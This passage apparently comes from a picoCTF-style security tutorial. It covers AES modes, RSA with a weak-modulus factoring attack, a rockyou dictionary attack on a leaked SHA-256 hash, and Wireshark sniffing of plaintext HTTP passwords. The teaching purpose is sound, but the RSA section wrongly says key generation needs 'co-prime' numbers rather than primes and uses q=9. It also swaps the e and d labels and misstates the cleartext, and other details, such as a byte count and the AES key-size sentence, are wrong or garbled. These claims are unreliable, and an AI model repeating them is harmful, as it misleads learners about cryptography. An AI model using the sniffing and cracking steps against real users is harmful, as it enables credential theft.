+<p>A commonly used algorithm today for symmetric cryptography, is AES, which means "Advanced Encryption Standard". This algorithm has a combination of substitutions and transpositions using a key of fixed length. A key of fixed length means that the algorithm can only have a key with a certain size. However, AES has different versions and each version can support a key length of different sizes. The most common versions are AES 128 and AES 256, which have a key length of 128 bits and AES 256 respectively. AES algorithm is considered secure. However, the implementation can be attacked successfully if it has flaws. For example, one famous way to break AES encryption is the Padding Oracle Attack, which allows to successfully crack SSL, an encrypted protocol that was widely used to secure HTTP traffic. However, this is not a weakness of AES, but a weakness in how it is used.</p>
+</div>
+<div class="paragraph">
+<p>AES has different operation modes. We will analyze two of them to illustrate vulnerabilities that can emerge in their use. This operation modes are "ECB" and "CBC".</p>
+</div>
+<div class="sect4">
+<h5 id="_operation_mode_ecb">Operation mode ECB</h5>
+<div class="paragraph">
+<p>ECB means Electronic Code Book. In this operation mode we encrypt independently blocks of the clear text according to the key length. For example, if we are using AES 128, we break the clear text in chunks of 128 bits and use AES to encrypt them independently. This causes a problem because it leaks structure in the encrypted text. There is a famous example on the internet about an image of Tux (the penguin from linux) encrypted using AES in ECB operation mode:</p>
+</div>
+<div class="paragraph">
+<p>Original image:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image46.png" alt="image" width="196" height="216"></span></p>
+</div>
+<div class="paragraph">
+<p>Encrypted image using AES on ECB mode:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image47.png" alt="image" width="196" height="216"></span></p>
+</div>
+<div class="paragraph">
+<p>Yow can see that is easy to identify that the encrypted image contains the penguin. In other cases this operation mode can be very bad for other reasons. Suppose you are sending an encrypted text and you know that the first 128 bits contain a name and the second 128 bits contain a date. Imagine that you are an attacker that captures some encrypted messages on different dates. Even if you do not know the key, you could be able to interchange the second block of messages to tamper the date. To understand this better let&#8217;s look at an example. Suppose you intercept a message sent on May 1, and after some days you intercept another message in on may 8.</p>
+</div>
+<div class="paragraph">
+<p>Imagine you want to make the receiver think that the second message is from May 1. You could simply replace the blue block by the red block.</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image3.png" alt="5image3"></span></p>
+</div>
+<div class="paragraph">
+<p>Another problem of ECB, is that if you send the same message twice, any attacker can see that the same message is being sent again. A secure encryption algorithm should not leak any information about the message. Knowing that the same message was sent in the past can be used to learn details about the communication. It is simply recommended to never use ECB.</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_operation_mode_cbc">Operation mode CBC</h5>
+<div class="paragraph">
+<p>A more secure operation mode is CBC, which means Cipher Block Chaining. In this mode we include additional elements. The first one is the initialization vector; a random value with the same size as the key. In AES, the key size is the same as the block size. Remember that in AES we have to separate the cleartext in blocks with the same size as the key. Before starting the encryption, we do XOR between the first block of cleartext and the Initialization Vector, then we begin to encrypt using AES with the key of our choice. The initialization vector is different for every message, so if we send the same message twice, it will be different due to the initialization vector. We must attach the initialization vector to the message. Another element we add in this operation mode, is that we do not encrypt blocks independently, but we use the encrypted text from one block and XOR it with the next block of cleartext we want to encrypt. Then, we use AES and the key to encrypt that result. In the following image it is shown the graphical representation of what it was just explained, note that the circle with the cross means XOR:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image48.png" alt="image" width="624" height="250"></span></p>
+</div>
+<div class="paragraph">
+<p>In AES, the cleartext has to be the same size as a multiple of the block size. For example, If you have a cleartext that happens to be shorter than a block, you need to add padding to the cleartext so it matches at least one block. In case that the cleartext is larger than one block, but smaller than two, you need two add padding to the cleartext until it is the same size as two blocks. In AES there is a common way of padding, which is actually a standard called PKCS #7. In AES 128, as we said previously, the block size is 128 bits, which is equivalent to 16 bytes. Suppose you want to encrypt the message</p>
+</div>
+<div class="paragraph">
+<p>"HELLOPICOCTF"</p>
+</div>
+<div class="paragraph">
+<p>Since that message is 12 bytes, we require to add a padding of 4 bytes to complete the size of a block. In PKCS#7, you pad using a byte with the value of bytes you need to pad. In our example, since we need to pad 4 bytes to complete 16 byte, we would pad like this:</p>
+</div>
+<div class="paragraph">
+<p>"HELLOPICOCTF"+"\x04\x04\x04\x04"</p>
+</div>
+<div class="paragraph">
+<p>Note that "\x" is a way to tell that in a string we want to use that exact number on a byte, even if it is not printable ASCII. Now, suppose we want to encrypt a message of 14 bytes like:</p>
+</div>
+<div class="paragraph">
+<p>"GOODBYEPICOCTF!"</p>
+</div>
+<div class="paragraph">
+<p>After we pad it using PKCS#7, the result is:</p>
+</div>
+<div class="paragraph">
+<p>"GOODBYEPICOCTF!"+"\x01"</p>
+</div>
+<div class="paragraph">
+<p>What would be the result after padding the message "BYEPICOCTF"?</p>
+</div>
+<div class="paragraph">
+<p>…</p>
+</div>
+<div class="paragraph">
+<p>If you answered:</p>
+</div>
+<div class="paragraph">
+<p>"BYEPICOCTF"+"\x06\x06\x06\x06\x06\x06"</p>
+</div>
+<div class="paragraph">
+<p>You are correct.</p>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_asymmetric_crypto_example_rsa">5.4.2. Asymmetric crypto example: RSA</h4>
+<div class="paragraph">
+<p>Remember that asymmetric crypto, means that we use one key for encrypting (the public key) and another key for decrypting (the private key). Suppose you want to communicate secretly with asymmetric crypto. In that case, you generate a public and private key pair. Then, give the public key to anyone that wants to send you encrypted an encrypted message. They will encrypt the message using your public key and when you receive the encrypted message, you are the only one that can decrypt it, because you are the only one that has the private key. That&#8217;s why it is called "private". Note that your public key can be of public knowledge and no one would be able to decrypt the message. If you want to send an encrypted message to someone, that person would have to give you their public key.</p>
+</div>
+<div class="paragraph">
+<p>A very widely used algorithm for asymmetric cryptography is RSA. It is called RSA because of its inventors: Ronald <strong>R</strong>ivest, Adi <strong>S</strong>hamir, and Leonard <strong>A</strong>dleman. To understand how it works, we will encrypt and decrypt using RSA algorithm with a public-private key pair that was generated for this example; it will seem a bit magical. After that, we will understand some concepts, learn to generate keys, and encrypt and decrypt with the generated keys.</p>
+</div>
+<div class="paragraph">
+<p>Before encrypting, you need to understand how it works the modulo operation if you do not know already. It is actually very simple. The modulo operation finds the remainder after division of one number by another. For example, 8 mod 3 = 2, because 3 fits in 8 two times, and we have a reminder of 2. Since RSA uses very basic arithmetic, we are ready to see the example. In RSA, the public key is a pair of numbers, as well as the private key. The message can be anything that we can represent as a number. In a computer, everything is a number as we know. The encrypted text, also called ciphertext, will be another number. In summary, this what we need in RSA to encrypt and decrypt:</p>
+</div>
+<div class="paragraph">
+<p>RSA public key: Is a pair of numbers (e,n)</p>
+</div>
+<div class="paragraph">
+<p>RSA private key: Is a pair of numbers (d,n)</p>
+</div>
+<div class="paragraph">
+<p>Message: m</p>
+</div>
+<div class="paragraph">
+<p>Ciphertex: c</p>
+</div>
+<div class="paragraph">
+<p>To encrypt: m<sup>e</sup> mod n = c</p>
+</div>
+<div class="paragraph">
+<p>To decrypt: c<sup>d</sup> mod n = m</p>
+</div>
+<div class="paragraph">
+<p>Basically, 'd' is the private value of the private key, since 'n' is also in the public key. As you just saw, the formulas are very simple. To encrypt a message you simply take the message to the power of 'e', and then do modulo 'n'. To decrypt, take the ciphertext to the power of 'd', and then do modulo 'n', and that would result in the original message. In this example the numbers of the keys are very small; that is insecure in real life. RSA is only secure when large values are used. In 2019, RSA is considered secure only if the key is a number that would take at least 2048 bits. Which is roughly a number of <strong>617 digits</strong>. This is how it looks a 617 digit number:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>639792933441952154134189948544473456738316249934191318148092777710386387734317720754565453220777092120190516609628049092636019759882816133231666365286193266863360627356763035447762803504507772355471058595487027908143562401451718062464362679456127531813407833033625423278394497538243720583531147711992606381334677687969597030983391307710987040859133746414428227726346594704745878477872019277152807317679077071572134447306057007334924369311383504931631284042512192565179806941135280131470130478164378851852909285452011658393419656213491434159562586586557055269049652098580338507224264829397285847831630577775606888764</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Certainly a very big number. However, to understand how it works it is a good idea to use small numbers. Let&#8217;s look at an example:</p>
+</div>
+<div class="paragraph">
+<p>Public key (e,n) &#8594; (11,117)</p>
+</div>
+<div class="paragraph">
+<p>Private key (d,n) &#8594; (35,117)</p>
+</div>
+<div class="paragraph">
+<p>Message m –&gt; 10</p>
+</div>
+<div class="paragraph">
+<p>So far, we have a private key which has an e=11, and a public key with a d=35. Our message is 10. To encrypt 10, we do:</p>
+</div>
+<div class="paragraph">
+<p>10<sup>11</sup> mod 117</p>
+</div>
+<div class="paragraph">
+<p>The result of that is 82. So we have:</p>
+</div>
+<div class="paragraph">
+<p>10<sup>11</sup> mod 117 = 82</p>
+</div>
+<div class="paragraph">
+<p>Ciphertext &#8594; 82</p>
+</div>
+<div class="paragraph">
+<p>Now, for decrypting, we do:</p>
+</div>
+<div class="paragraph">
+<p>82<sup>35</sup> mod 117 = 10</p>
+</div>
+<div class="paragraph">
+<p>Cleartext &#8594; 82</p>
+</div>
+<div class="paragraph">
+<p>That was a bit magical. The RSA private and public key are generated with some steps that makes them have this property. The process of key generation is relatively simple. We only need to understand some parts of it to show our attack. Note that "In number theory, two integers a and b are said to be relatively prime, mutually prime, or coprime (also written co-prime) if the only positive integer (factor) that divides both of them is 1. Consequently, any prime number that divides one does not divide the other. This is equivalent to their greatest common divisor (gcd) being 1"<sup class="footnote">[<a id="_footnoteref_1" class="footnote" href="#_footnotedef_1" title="View footnote.">1</a>]</sup>. The multiplicative inverse, is a number that we use to multiply another number, and obtain 1 as a result. For example, in non integer arithmetic (in RSA we only use integer arithmetic) the multiplicative inverse of 8, is 1/8, Because 8 * 1/8=1. However in integer arithmetic we don&#8217;t have fractions. But we can have a multiplicative inverse modulo n, which means that if we have a number, multiply it by its multiplicative inverse, and take modulo n, the result will be 1.</p>
+</div>
+<div class="paragraph">
+<p>For example, the multiplicative inverse in 3 modulo 4, is 3, Why? Because if you multiply 3*3, that results in 9, and 9 modulo 4, is 1. Now you are ready to see the key generation without getting lost. This is it:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Generate two large co-prime numbers, p and q.</p>
+</li>
+<li>
+<p>Find n = pq and phi = (p-1) (q-1)</p>
+</li>
+<li>
+<p>Select e such that 1 &lt; e &lt; phi, and e is coprime of phi</p>
+</li>
+<li>
+<p>Find d, which is the multiplicative inverse of e modulo phi.</p>
+</li>
+<li>
+<p>The couple (e, n) is the public key</p>
+</li>
+<li>
+<p>The couple (d, n) is the private key</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>It is relatively simple! To find a multiplicative inverse, you can use the Extended Euclidean Algorithm (EEA). In google it is easy to find an online implementation of it. Remember our example in which we had these key pair?</p>
+</div>
+<div class="paragraph">
+<p>Public key (e,n) &#8594; (11,117)</p>
+</div>
+<div class="paragraph">
+<p>Private key (d,n) &#8594; (35,117)</p>
+</div>
+<div class="paragraph">
+<p>That was generated in exactly the same manner. First we picked two coprime numbers. The number of our choice were:</p>
+</div>
+<div class="paragraph">
+<p>p=13</p>
+</div>
+<div class="paragraph">
+<p>q=9</p>
+</div>
+<div class="paragraph">
+<p>They are coprime, because their greatest common divisor is 1. Then</p>
+</div>
+<div class="paragraph">
+<p>n=13*9=117</p>
+</div>
+<div class="paragraph">
+<p>phi=(13-1)(9-1)=96</p>
+</div>
+<div class="paragraph">
+<p>To pick e, we arbitrarily pick a number that is greater than 1 and less than phi, and it is coprime with phi. The number 11 complies with those requirements. So</p>
+</div>
+<div class="paragraph">
+<p>e=11</p>
+</div>
+<div class="paragraph">
+<p>Now, to obtain 'd' applying the EEA. We can do that on this web site:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://planetcalc.com/3298/" class="bare">https://planetcalc.com/3298/</a><span class="[.underline"><a href="https://planetcalc.com/3298/" class="bare">https://planetcalc.com/3298/</a></span>]</p>
+</div>
+<div class="paragraph">
+<p>So we input 11 and 96 in the following manner:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image49.png" alt="5image49"></span></p>
+</div>
+<div class="paragraph">
+<p>And the result we want is 35. So we have that</p>
+</div>
+<div class="paragraph">
+<p>d=35</p>
+</div>
+<div class="paragraph">
+<p>With those results, we know that are private and public keys are:</p>
+</div>
+<div class="paragraph">
+<p>Public key (e,n) &#8594; (11,117)</p>
+</div>
+<div class="paragraph">
+<p>Private key (d,n) &#8594; (35,117)</p>
+</div>
+<div class="paragraph">
+<p><strong>Excercise</strong>: Create your own public and private key, and use it to encrypt and decrypt a two digit number!</p>
+</div>
+<div class="sect4">
+<h5 id="_attacking_rsa">Attacking RSA</h5>
+<div class="paragraph">
+<p>RSA can be easily broken if it has a small 'n'. This does not happen often in real life, unless a programmer decides to implement its own version of RSA. A programmer should not make its own implementations of cryptography, it is a general rule to use libraries tested by industry. The security of RSA is based on the fact that there is not an efficient algorithm to factorize a large 'n', so an attacker is not able to generate the private key from the public key. In case 'n' is too small, it is possible to factorize it.</p>
+</div>
+<div class="paragraph">
+<p>We are going to see how to break RSA by recovering the private key from the public. In real life, the public key comes in a digital certificate, which is a package that contains data related to the owner of the public key along with the public key itself. Digital certificates are often encoded in base64, which is a way of encoding a binary as a printable text. The following is an example of a digital certificate encoded in base64:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>-----BEGIN CERTIFICATE-----
+MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
+Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
+VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
+B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
+hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
+al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
+eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
+T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
+BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
+b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
+q16/S1WLvzg4PsElmv1f
+-----END CERTIFICATE-----</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Copy that text into a text file on the shell server, and name it "weak_n_certificate". The first thing we have to do to crack RSA with a weak n, is to extract the n from the certificate. Remember that n is the modulus and e is the exponent.
+You can use the following command to extract those values:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>openssl x509 -in weak_n_certificate -text -noout</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>In this case,</p>
+</div>
+<div class="paragraph">
+<p>n= 4966306421059967</p>
+</div>
+<div class="paragraph">
+<p>e= 65537</p>
+</div>
+<div class="paragraph">
+<p>As we can see in the output of the command:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>Certificate:
+    Data:
+        Version: 1 (0x0)
+        Serial Number: 12345 (0x3039)
+        Signature Algorithm: md2WithRSAEncryption
+        Issuer: CN = PicoCTF
+        Validity
+            Not Before: Jul  8 07:21:18 2019 GMT
+            Not After : Jun 26 17:34:38 2019 GMT
+        Subject: OU = PicoCTF, O = PicoCTF, L = PicoCTF, ST = PicoCTF, C = US, CN = PicoCTF
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: (53 bit)
+                Modulus: 4966306421059967 (0x11a4d45212b17f)
+                Exponent: 65537 (0x10001)
+    Signature Algorithm: md2WithRSAEncryption
+         07:6a:5d:61:32:c1:9e:05:bd:eb:77:f3:aa:fb:bb:83:82:eb:
+         9e:a2:93:af:0c:2f:3a:e2:1a:e9:74:6b:9b:82:d8:ef:fe:1a:
+         c8:b2:98:7b:16:dc:4c:d8:1e:2b:92:4c:80:78:85:7b:d3:cc:
+         b7:d4:72:29:94:22:eb:bb:11:5d:b2:9a:af:7c:6b:cb:b0:2c:
+         a7:91:87:ec:63:bd:22:e8:8f:dd:38:0e:a5:e1:0a:bf:35:d9:
+         a4:3c:3c:7b:79:da:8e:4f:fc:ca:e2:38:67:45:a7:de:6e:a2:
+         6e:71:71:47:f0:09:3e:1b:a0:12:35:15:a1:29:f1:59:25:35:
+         a3:e4:2a:32:4c:c2:2e:b4:b5:3d:94:38:93:5e:78:37:ac:35:
+         35:06:15:e0:d3:87:a2:d6:3b:c0:7f:45:2b:b6:97:8e:03:a8:
+         d4:c9:e0:8b:68:a0:c5:45:ba:ce:9b:7e:71:23:bf:6b:db:cc:
+         8e:f2:78:35:50:0c:d3:45:c9:6f:90:e4:6d:6f:c2:cc:c7:0e:
+         de:fa:f7:48:9e:d0:46:a9:fe:d3:db:93:cb:9f:f3:32:70:63:
+         cf:bc:d5:f2:22:c4:f3:be:f6:3f:31:75:c9:1e:70:2a:a4:8e:
+         43:96:ac:33:6d:11:f3:ab:5e:bf:4b:55:8b:bf:38:38:3e:c1:
+         25:9a:fd:5f</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Factorize that n is pretty easy. If you google "integer factorization online", the first result is this one:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://www.alpertron.com.ar/ECM.HTM"><span class="underline">https://www.alpertron.com.ar/ECM.HTM</span></a></p>
+</div>
+<div class="paragraph">
+<p>Input the value of n in the text field on that website, and click the button factor. You will get the following:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image50.png" alt="image" width="624" height="533"></span></p>
+</div>
+<div class="paragraph">
+<p>That is correct, 67867967 and 73176001 happen to be 'p' and 'q' in the RSA public key. Having those to values, you are be able to calculate the private key.</p>
+</div>
+<div class="paragraph">
+<p><strong>Challenge</strong>: what is the private key?</p>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_hashing">5.4.3. Hashing</h4>
+<div class="paragraph">
+<p>Imagine you want to download a big file from the internet. However, after downloading, you want to check that every bit of the file is correct, and nothing was changed because of a transmission error or a malicious attacker. To do this, you can use a hash, which is a value that you get after applying a hash function to the file, and you obtain a string of fixed length that identifies that file. Whenever you apply the hash function to the file, you will get exactly the same hash, unless the file has been modify. If one bit of the file was changed, you would get a very different hash. So, using a hash we can check the integrity.</p>
+</div>
+<div class="paragraph">
+<p>There are several hash functions used in industry that are considered secure. One that is commonly used, is SHA2, which means "Secure Hashing Algorithm 2", because it is the second version of SHA. Let&#8217;s look at an example. Open the shell server and create a file called "bio.txt" and copy paste the following content (do not include the quotes and make sure there is not break line at the end or beginning):</p>
+</div>
+<div class="paragraph">
+<p>"Charles Babbage KH FRS (26 December 1791 – 18 October 1871) was an English polymath. A mathematician, philosopher, inventor and mechanical engineer, Babbage originated the concept of a digital programmable computer."</p>
+</div>
+<div class="paragraph">
+<p>Save it, and run the command "sha256sum" like this:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>sha256sum bio.txt</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>As a result, you should get a hex string of 64 characters. In this particular text, you should get:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="text"><span></span>338f1cefc564f86ecfc241310d35e31125bb14cff61c080f293be2ef24fb3a69</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>That string is an identification for the information contained in our file. If we make just a little change to the file, it will change completely. For example, create a new file called "bio2.txt" with the same data, but now without the dot at the end:</p>
+</div>
+<div class="paragraph">
+<p>"Charles Babbage KH FRS (26 December 1791 – 18 October 1871) was an English polymath. A mathematician, philosopher, inventor and mechanical engineer, Babbage originated the concept of a digital programmable computer"</p>
+</div>
+<div class="paragraph">
+<p>Save it, and run the command "sha256sum" like this:</p>
+</div>
+<div class="paragraph">
+<p>sha256sum bio2.txt</p>
+</div>
+<div class="paragraph">
+<p>You should get:</p>
+</div>
+<div class="paragraph">
+<p>3e7e604c81440507f6140becfed1c3510bc49cc4745c938166b9979245215618</p>
+</div>
+<div class="paragraph">
+<p>Note that the hash is very different just because we removed one single dot. Now, add the dot back at the end in the file bio2.txt, and run "sha256sum" on that file. You should get the original hash that we got from "bio.txt", because the information contained in the file is exactly the same.</p>
+</div>
+<div class="paragraph">
+<p>So, if we store a file, calculate the hash, and keep the hash with us, we could know if the file was modified by recalculating the hash and verifying that it matches with the hash we had. This is a very useful integrity measure. One caveat, is that an attacker should not have access to the place in which the hash is stored, because in that case, the attacker would be able to modify the file, recalculate the hash, and replaced the stored hash, so we would not be able to tell that the file was modified.</p>
+</div>
+<div class="paragraph">
+<p>Hashes, are commonly used to store passwords in a database. When a user logs in, the hash of the password is calculated and it is compared with the hash stored. If they match, we know that the user input the correct password. Note that a fundamental property of hashes is that it is impossible to get the original text from the hash. Because of that, a system administrator would not be able to learn the actual password of users if they have access to the database. In the case of a data breach, when a database is leaked, attackers would not be able to obtain the real password of users.</p>
+</div>
+<div class="paragraph">
+<p>How can a hash be attacked? In the case of passwords, an attacker can create a table that maps several passwords to their hash by calculating the hash of several words, for example all the words in an english dictionary. In that way, if the attacker finds a hash of the password in the database, and the password was a word present in an english dictionary, it could be possible to map it back to the original password by looking for it in the table. However, if a user picked a secure password, this attack would not work because that secure password with complexity, would not be ina dictionary. Note there are lists of commonly used passwords which contain words in several languages and modifications of them, for example, "Hello_12345". A secure password should be random characters to prevent this attack.</p>
+</div>
+<div class="paragraph">
+<p>Challenge: The following hash of a password was leaked from a database, and you know the user did not use a strong password.</p>
+</div>
+<div class="paragraph">
+<p>e7ae6cfee91a324590df7b048dcc9802b7389c1b0d996d474d61c4cbb1253455</p>
+</div>
+<div class="paragraph">
+<p>Search on google the list of passwords called "rockyou", and generate the hash to find the password that corresponds to the leaked hash!</p>
+</div>
+<div class="paragraph">
+<p>Hint: you can use python to generate hashes. The hashing algorithm is SHA2.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_6_the_network">6. 6 The Network</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>A network is made up of several computers connected. They can be connected through different protocols. A Protocol is a set of rules that allow two computers in a network to send and receive information. That set of rules is essential to understand what information is coming from what source, or how to send information to a particular computer in the network. To sniff traffic in a network, we will be using a tool called Wireshark, which can show the packets transmitted on a network and we can get passwords from insecure connections. But first, we will briefly explain some important things so you roughly understand the composition of a packet and can extract the parts you need.</p>
+</div>
+<div class="sect2">
+<h3 id="_network_layers">6.1. Network Layers</h3>
+<div class="paragraph">
+<p>The networks we commonly used today, are broken down into different layers. This design by layers assigns responsibilities to each layer to accomplish something. It is good to have a design by layers for several reasons. For example, if network engineers want to make a change in one of the layers, the impact on the other layers is minimized. Another example, is that if you are a programmer and want to connect your application with a server, you do not necessarily need to care if the user is using wifi or ethernet cable, or how the user is connection to the internet. Your application can simply trust other layers are going to take care of that and your application will have a successful connection. These are the layers, viewed in a top down approach.</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Application layer: Responsible for handling data traffic between applications. HTTP belongs to this layer, HTTP protocol is commonly used to obtain Web Pages.</p>
+</li>
+<li>
+<p>Transport layer: Responsible for providing several connections on the same host, that means that you can have several applications on the same device and each of them can have a different connection even if it is just one device. It also defines functionalities for reliable transport. Two protocols are used on this layer. TCP (Transport Control Protocol). You use this protocol when you need to have reliable transport, this makes sure that if a piece of information was missing while being transfer, is resent again. HTTP from the Application layer, runs on top of TCP, because when you visit a Web Page you want to have every part of it accurately. On the other hand, when you don’t need reliable transport, but you want faster transport that does not resend parts that were missing, UDP (User Datagram Protocol) is used. An example when UDP is needed is for voice communication. When you are talking if a little part of the audio is missing, you do not want it to appear later in the communication because that would confuse the listener. It is preferred that is simply lost, and the listener can still understand what you are saying if that little part missing is small enough. Since UDP has no controls for transport, it is faster than TCP. This layer assigns a port to each connection, and that is how it tells the difference between connections in the same computer, because of the port.</p>
+</li>
+<li>
+<p>Network layer: It provides devices with an address in the network called the IP (Internet Protocol) address, and routes information through different routers. It provides mapping between all the computers connected to the internet. When you connect to a network in some specific place, an IP is assigned to your device.</p>
+</li>
+<li>
+<p>Data link layer: It provides communication between devices that are connected directly. Examples of protocols in the data link layer are Ethernet or WiFi. You generally use WiFi to send messages to your router directly without any other devices in between. Each device has a physical address in wifi or ethernet, known as the mac address. The mac address is used for this layer. This is not an address like the IP that can change depending on the network you are connected to. The mac address is assigned to the hardware of your network card when it is manufactured.</p>
+</li>
+<li>
+<p>Physical layer: This handles electrical pulses on the wire that represent bits.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>When you access a browser and visit a web site , the information of the web site is downloaded in packets. Today’s Internet is pretty fast, and you might feel that the website appears all at once. But if you download a big file, you can see that it takes some time. This happens because the file is broken down into packets that are received in your computer, and begin to accumulate, until they are all received and conform the whole file when the download is completed. Each packet contains a piece corresponding to each layer.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_sniffing_and_attack_example">6.2. Sniffing and attack example</h3>
+<div class="paragraph">
+<p>In a tool called wireshark, we can “sniff” the packets transmitted on a network. The technical term that is used to refer to a tool like wireshark it is actually “sniffer”.</p>
+</div>
+<div class="paragraph">
+<p>On your computer, Download wireshark from their site:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://www.wireshark.org/" class="bare">https://www.wireshark.org/</a><span class="[.underline"><a href="https://www.wireshark.org/" class="bare">https://www.wireshark.org/</a></span>]</p>
+</div>
+<div class="paragraph">
+<p>You have to download the version corresponding to your operating system. It should be a very easy process, however, if you have any issue or doubt, at Google there is plenty of good documentation about Wireshark.</p>
+</div>
+<div class="paragraph">
+<p>Once you install it, open it and you should see a window similar to this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image39.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="paragraph">
+<p>That is the list of devices you can sniff. In this case, we want to sniff the network card you are using to connect to the internet. If you are connected to a WiFi, you should select the one that is called “WiFi”. In case you are connected to the Internet using Ethernet cable, you should select “Ethernet”. Then, click the “start capture” button on the upper left side which is circled in the following image:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image40.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="paragraph">
+<p>The capture now starts. If you have applications running on your computer or have website open in your browser, you will probably see several packets immediately, leave that Wireshark window running the packet sniffing. In your browser, navigate to the following link:</p>
+</div>
+<div class="paragraph">
+<p><a href="http://www.samuelsabogalpardo.com/pico/sign_in.php"><span class="underline">http://www.samuelsabogalpardo.com/pico/sign_in.php</span></a></p>
+</div>
+<div class="paragraph">
+<p>You should see the following page:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image41.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="paragraph">
+<p>Now come back to the Wireshark window. What we want to do now is finding the packets that were sent and received in your computer when you accessed the link. If there are too many packets from all the connections on your computer, that would be hard task without the help of a wireshark filter. A wireshark filter allows you to tell wire shark that you only want to see some specific packets. You can filter by protocol, a particular ip, string on your request, or anything you need that helps you find what you are looking for faster. When we accessed the link on the browser, we did an HTTP request. We can filter http request, by simply typing http on the filter textfield and pressing enter. The following image shows the results and we circled in red the textfield in which you have to type:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image42.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="paragraph">
+<p>Right below the textfield in which you typed it is the packet list. We can see two packets. The first one is the request your browser sent to the server asking for the web page, so naturally it has your IP as the source, and the IP of the server as the destination. The second packet is the reply, which now has your IP as the destination and the IP of the server as the source because now the server is the one that is sending the page to you after you request it.</p>
+</div>
+<div class="paragraph">
+<p>In the lower part of the window, we can see the information related to all the layers we explained previously of the currently selected packet. Now, we will send a user and password to the web site. This page in particular does not do anything after you send a password, it is just receive it and does nothing, but the important thing is to note that we can see the password on wireshark when we send it. In the web page, type the following in user and password respectively:</p>
+</div>
+<div class="paragraph">
+<p>picouser</p>
+</div>
+<div class="paragraph">
+<p>picopassword</p>
+</div>
+<div class="paragraph">
+<p>In Wireshark, you should see now two more packets, one in which you send the user and password, and the reply of the server. Note that the reply of the server is the same page, as we said this page does nothing. So far we have 4 packets, and the third one is the one in which you send the user and password!</p>
+</div>
+<div class="paragraph">
+<p>Click the third packet, and in the lower part of the window where are show the layers, click “Hypertext Transfer Protocol”. Note that at the end we can see &amp;password=picopassword</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image43.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="paragraph">
+<p>So we just found the password we sent using sniffing. A fundamental thing to note, is that we were able to do that because the website was using HTTP, instead of HTTPS which is encrypted. Encryption prevents us from understanding the contents of a packet.</p>
+</div>
+<div class="paragraph">
+<p>Additionally, we are always able the network card of our own computer. However, if we want to sniff packets from other devices connected to the same wifi, we have to do additional things because WiFi could be using encryption. We encourage you to use a second device, it can be a smartphone, to access the web page and send a password. Then in your computer use Wireshark to capture the password sent, but first you need to do two things:</p>
+</div>
+<div class="paragraph">
+<p>Enable monitor mode in Wireshark: Stop any packet capture you are doing and open the capture dialog, which is located in the upper part of the window and click “options”Choose Wifi Interface and check “monitor” as in the following image:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/5image44.png" alt="image" width="624" height="529"></span></p>
+</div>
+<div class="admonitionblock important">
